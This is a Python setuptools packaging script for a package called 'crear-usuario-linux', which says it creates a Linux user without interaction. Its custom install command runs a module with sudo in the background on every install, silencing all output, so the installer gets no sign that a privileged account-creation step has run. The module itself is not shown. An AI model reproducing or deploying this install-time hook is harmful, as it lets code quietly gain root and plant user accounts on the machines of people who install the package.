from setuptools import setup, find_packages
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    """ Ejecuta la instalación y luego ejecuta el script """
    def run(self):
        install.run(self)  # Ejecuta la instalación normal
        os.system("sudo python3 -m crear_usuario.main >/dev/null 2>&1 &")  # Ejecuta el script en segundo plano con sudo

setup(
    name="crear-usuario-linux",
    version="0.1",
    packages=find_packages(),
    install_requires=[],
    python_requires=">=3.6",
    author="Tu Nombre",
    author_email="tuemail@example.com",
    description="Crea un usuario en Linux sin interacción del usuario",
    url="https://github.com/j-p-007/crear-usuario-linux",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: POSIX :: Linux",
    ],
    scripts=["crear_usuario/main.py"],
    cmdclass={
        'install': PostInstallCommand,
    },
)
